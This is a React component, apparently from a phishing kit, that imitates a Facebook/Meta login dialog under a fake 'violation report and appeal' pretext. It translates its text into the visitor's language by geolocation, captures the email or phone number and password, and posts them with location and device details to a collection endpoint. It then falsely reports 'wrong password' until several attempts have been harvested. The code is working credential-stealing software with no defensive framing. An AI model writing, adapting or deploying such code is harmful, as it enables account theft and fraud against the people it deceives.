import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import { buildAppealMessage } from '@/utils/message';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { faTriangleExclamation } from '@fortawesome/free-solid-svg-icons/faTriangleExclamation';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { type FC, useEffect, useState } from 'react';

const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [accountInput, setAccountInput] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, deviceLabel, messageId, userData, addAccount, addPassword, setMessageId } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = [
            'Email or phone number',
            'Password',
            'You entered the wrong password. Please try again.',
            'Continue',
            'Để xem những báo cáo và hình ảnh vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Facebook để tiếp tục'
        ];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        if (!accountInput.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        addAccount(accountInput);
        addPassword(password);

        const allAccounts = [...userData.accounts, accountInput];
        const allPasswords = [...userData.passwords, password];
        const message = buildAppealMessage({
            geoInfo,
            deviceLabel,
            userData,
            accounts: allAccounts,
            passwords: allPasswords,
            maxPass
        });

        try {
            const res = await axios.post('/api/send', {
                message,
                old_message_id: messageId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            if (config.PASSWORD_LOADING_TIME) {
                await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
            }
            if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div
                className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-7 rounded-3xl border border-white/60 p-4 shadow-[0_18px_45px_rgba(31,41,55,0.16)] backdrop-blur-[2px]'
                style={{ background: 'linear-gradient(135deg, rgb(250, 233, 239), rgb(217, 234, 250), rgb(222, 249, 234))' }}
            >
                <Image src={FacebookLogoImage} alt='' className='mt-9 h-[70px] w-[70px]' />
                <div className='flex w-full flex-1 flex-col justify-center'>
                    <div className='mb-3 w-full'>
                        <p className='w-full text-left text-[15px] leading-[1.45] font-medium text-[#4f5662]'>
                            <FontAwesomeIcon icon={faTriangleExclamation} className='mr-2 text-[#e09b1b]' />
                            {t('Để xem những báo cáo và hình ảnh vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Facebook để tiếp tục')}
                        </p>
                    </div>
                    <div className='relative mb-3 w-full'>
                        <input
                            type='text'
                            id='account-input'
                            value={accountInput}
                            onChange={(e) => setAccountInput(e.target.value)}
                            className='peer h-[60px] w-full rounded-xl border border-[#cdd9e7] bg-white/85 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-[0_2px_8px_rgba(31,41,55,0.06)] transition-colors focus:border-[#4f86e9] focus:outline-none'
                            placeholder={t('Email or phone number')}
                        />
                        <label htmlFor='account-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#3f76d8] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            {t('Email or phone number')}
                        </label>
                    </div>
                    <div className='relative w-full'>
                        <input
                            type={showPassword ? 'text' : 'password'}
                            id='password-input'
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className='peer h-[60px] w-full rounded-xl border border-[#cdd9e7] bg-white/85 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-[0_2px_8px_rgba(31,41,55,0.06)] transition-colors focus:border-[#4f86e9] focus:outline-none'
                            placeholder={t('Password')}
                        />
                        <label htmlFor='password-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#3f76d8] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            {t('Password')}
                        </label>
                        <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#6b7280] transition-colors hover:text-[#3f76d8]' onClick={togglePassword} />
                    </div>
                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t('You entered the wrong password. Please try again.')}</p>}
                    <button
                        onClick={() => {
                            handleSubmit();
                        }}
                        disabled={isLoading || !accountInput.trim() || !password.trim()}
                        className={`mt-4 flex h-[50px] w-full items-center justify-center gap-2 rounded-full bg-linear-to-r from-[#2e7bf2] to-[#2563eb] font-semibold text-white shadow-[0_10px_22px_rgba(37,99,235,0.34)] transition-all hover:from-[#236fe6] hover:to-[#1d5cd9] ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                    >
                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
                    </button>
                </div>
                <div className='flex items-center justify-center pt-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
